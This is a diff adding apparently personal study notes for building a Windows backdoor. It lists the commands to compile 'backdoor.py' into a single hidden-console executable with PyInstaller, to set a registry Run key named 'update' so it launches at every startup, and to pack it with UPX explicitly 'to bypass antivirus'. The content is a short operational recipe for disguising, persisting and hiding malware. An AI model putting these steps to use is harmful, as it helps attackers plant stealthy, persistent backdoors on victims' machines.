@@ -1,0 +1,17 @@
+C:\Users\IEUser\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe # Para transformar los scripts de python en .exe
+C:\Users\IEUser\AppData\Local\Programs\Python\Python310\python.exe
+C:\Users\IEUser\AppData\Local\Programs\Python\Python310\python.exe -m pip install <package name>
+C:\Python27\python.exe
+
+# --noconsole won't work with programs that interact with the standard input, 
+# output and error, like the check_output funstion from subprocess in our backdoor.
+# We have to tell python in the code what to do with the information, standard error
+# and the standard input. The standard output will be automatically handled
+C:\Users\IEUser\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe backdoor.py --onefile --noconsole
+
+# Command to run a program everytime the system starts
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "<path of the file between double quotes>"
+
+# To bypass antivirus we can compress our file using upx. First we must be
+in the directory where upx is, /opt/upx-3.96, and then:
+./upx <full location of the file we want to compress> -o <location and name of the result>
